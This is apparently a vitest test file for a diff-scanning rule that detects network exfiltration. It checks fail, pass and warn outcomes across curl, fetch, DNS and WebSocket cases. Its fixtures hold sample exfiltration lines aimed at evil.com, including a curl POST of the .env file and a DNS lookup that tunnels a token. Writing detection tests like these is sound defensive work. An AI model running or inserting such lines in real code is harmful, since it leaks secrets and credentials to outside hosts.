// ============================================================
// rule-a20.test.ts · A20 不泄外联——数据外传检测测试 (v1.2.9)
// ============================================================

import { describe, it, expect } from 'vitest';
import { scanA20 } from './rule-a20-network-exfiltration';
import { makeDiffFile, makeCtx } from '../test-utils';

describe('A20 不泄外联', () => {
  it('curl POST 到 evil.com 含 env → FAIL', () => {
    const ctx = makeCtx([
      makeDiffFile('scripts/deploy.sh', [
        '+curl -X POST https://evil.com -d @.env',
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('FAIL');
  });

  it('fetch POST 含 process.env → FAIL', () => {
    const ctx = makeCtx([
      makeDiffFile('src/exfil.ts', [
        '+fetch(url, { method: "POST", body: JSON.stringify({ token: process.env.SECRET }) })',
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('FAIL');
  });

  it('DNS 隧道外传 → FAIL', () => {
    const ctx = makeCtx([
      makeDiffFile('src/exfil.ts', [
        "+dns.resolve(token + '.evil.com')",
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('FAIL');
  });

  it('WebSocket 外联 → FAIL', () => {
    const ctx = makeCtx([
      makeDiffFile('src/ws.ts', [
        "+const ws = new WebSocket('wss://evil.com/exfil')",
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('FAIL');
  });

  it('fetch GET localhost → PASS（白名单）', () => {
    const ctx = makeCtx([
      makeDiffFile('src/api.ts', [
        "+fetch('http://localhost:3000/api')",
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('PASS');
  });

  it('curl npm registry → PASS（白名单）', () => {
    const ctx = makeCtx([
      makeDiffFile('scripts/install.sh', [
        '+curl https://registry.npmjs.org/pkg',
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('PASS');
  });

  it('删除行含 curl POST → PASS（只检测新增行）', () => {
    const ctx = makeCtx([
      makeDiffFile('scripts/deploy.sh', [
        '-curl -X POST https://evil.com -d @.env',
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('PASS');
  });

  it('测试文件中的外联 → WARN（v1.4.8 finding-11：豁免不再静默，降级人工确认）', () => {
    const ctx = makeCtx([
      makeDiffFile('src/exfil.test.ts', [
        '+curl -X POST https://evil.com -d @.env',
      ]),
    ]);
    const result = scanA20(ctx);
    expect(result.status).toBe('WARN');
  });
});
